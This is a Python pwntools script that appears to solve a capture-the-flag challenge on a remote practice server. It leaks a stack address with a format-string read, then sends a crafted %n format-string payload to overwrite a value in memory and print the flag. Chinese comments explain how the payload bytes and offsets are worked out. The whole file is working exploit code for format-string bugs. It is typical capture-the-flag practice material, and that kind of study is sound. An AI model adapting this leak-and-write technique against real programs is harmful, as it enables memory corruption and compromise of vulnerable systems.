from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', '11000')


def program(Text):
    r.recvuntil("choice!\n")
    r.sendline("2")
    r.recvuntil("out.\n")
    r.sendline(Text)


def flag():
    r.recvuntil("choice!\n")
    r.sendline("3")
    print(r.recvuntil("}"))


program("%269$p")
stack = r.recvuntil("\n")
print(str(stack))
stack = int(stack[0:11], 16)
banana = stack+4
print(banana)
# 0x3132000a
# 4 + 4 + 2 寫入 p32(banana) => a
# (10) + 12584 寫入 p32(banana+2) => 3132
# concept: 實際寫入內容 => p32(banana)+p32(banana+2)+b"%2c%7$n%12584c%8$n 共 8 byte
# little end: 第 7 byte 為 p32(banana+2)
# little end: 第 8 byte 為 p32(banana)
# final 格式: b(變更目標地址)+b(%目標值c%實際存儲區目標地址偏移量$n)
# note: 所有值都要經過微調, 串聯後也要微調
program(p32(banana)+p32(banana+2)+b"%2c%7$n%12584c%8$n")
flag()


r.interactive()
